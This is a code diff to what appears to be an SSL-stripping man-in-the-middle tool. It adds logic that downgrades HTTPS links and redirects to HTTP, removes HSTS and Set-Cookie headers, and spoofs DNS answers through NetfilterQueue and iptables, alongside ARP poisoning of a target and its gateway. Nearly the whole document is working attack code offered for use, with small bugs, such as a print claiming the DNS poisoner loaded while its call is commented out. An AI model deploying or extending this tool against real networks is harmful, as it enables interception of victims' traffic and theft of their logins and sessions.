@@ -60,44 +60,54 @@ class SSLStripRequestHandler(ProxyRequestHandler):
     replaced_urls = deque(maxlen=1024)
     def request_handler(self, req, req_body):
 	print "\n-----------------------------[Request]--------------------------------"
+	if ".home" in req.path:
+		print ".HOME FDP {}".format(req.path)
 	if req.headers:
 		print "[+]Original Headers:"
 		print req.headers
 	if req_body:
 		print "\n[+]Original Body:"
 		print req_body
-
-	#Replace the stripped response to server
-	#Need to modify the DnsPoisoner to resolve http://w + realdomain into the real https:// + realdomain
-	#Need to get and clear cookies
-        #if req.path in self.replaced_urls:
-        #    req.path = req.path.replace('http://w', 'https://')
-
+        if req.path in self.replaced_urls:
+            req.path = req.path.replace('http://', 'https://w')
 	print "\n----------------------------------------------------------------------"
+
     def response_handler(self, req, req_body, res, res_body):
 	print "\n----------------------------[Response]--------------------------------"
 	if res.headers:
-		print "\n[+]Original Headers:"
+		modified = False
+		print "\n[+] Original Headers:"
 		print res.headers
 		print
+		try:
+			res.headers['Location'] = res.headers['Location'].replace("https://","http://w")
+			replaced_urls.append(res.headers['Location'])
+			modified = True
+		except:
+			pass
+		try:
+			del res.headers['Strict-Transport-Security']
+			modified = True
+		except:
+			pass
+		try:
+			del res.headers['Set-Cookie']
+			modified = True
+		except:
+			pass
+		if modified:
+			print "\n[+] Modified Headers:"
+			print res.headers
+			print
 	if res_body:
-		print "\n[+]Original Body:"
+		modified = False
+		print "\n[+] Original Body:"
 		print res_body
-		print
-
-	#Weak need to enhance
-	#[META] Remove all https:// links and protections
-	# ex: Remove HSTS Headers, Protection
-
-        #def replacefunc(m):
-        #    http_url = "http://" + m.group(1)
-        #    self.replaced_urls.append(http_url)
-        #    return http_url
-        #re_https_url = r"https://([-_.!~*'()a-zA-Z0-9;/?:@&=+$,%]+)"
-        #if 'Location' in res.headers:
-        #    res.headers['Location'] = re.sub(re_https_url, replacefunc, res.headers['Location'])
-        #return re.sub(re_https_url, replacefunc, res_body)
-
+		if "href" in res_body or "HREF" in res_body:
+			print "\n[+] Modified Body:"
+			print res_body.replace("https://","http://w")
+			print
+			return res_body.replace("https://","http://w")
 	print "\n----------------------------------------------------------------------"
 
 
@@ -155,8 +165,9 @@ class SSLKiller(object):
 	    	    sys.stdout.flush()
 		self.ArpPoisoner()
 		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
+		#don't no if i continue with dnspoison or only with proxy trickstery
 		#self.DnsPoisoner()
-		#print "\n[+] DNS Poisoner thread loaded"
+		print "\n[+] DNS Poisoner thread loaded"
 
 	def ArpPoisoner(self):
 		#ARP Spoof both ways, target and gateway
@@ -182,19 +193,23 @@ class SSLKiller(object):
 			if not pkt.haslayer(DNSQR):
 				packet.accept()
 			else:
-		        	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                               		  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                               	          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                               	          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
-                             	packet.set_payload(str(new_pkt))
-                               	packet.accept()
+				if pkt[DNSQR].qname.startswith("wwww"):
+					host = pkt[DNSQR].qname[1:]
+					ip = socket.gethostbyname(host)
+		        		new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                               		  	  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                               	          	  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                               	          	  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
+                             		packet.set_payload(str(new_pkt))
+                               		packet.accept()
+				else:
+					packet.accept()
 		def DnsThread():
 			t = threading.Thread(name='DNSspoof', target=DnsPoison)
 			t.setDaemon(True)
 			t.start()
 		def DnsPoison():
 			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
-			os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
 			q = NetfilterQueue()
 			q.bind(1, callback)
 			q.run()
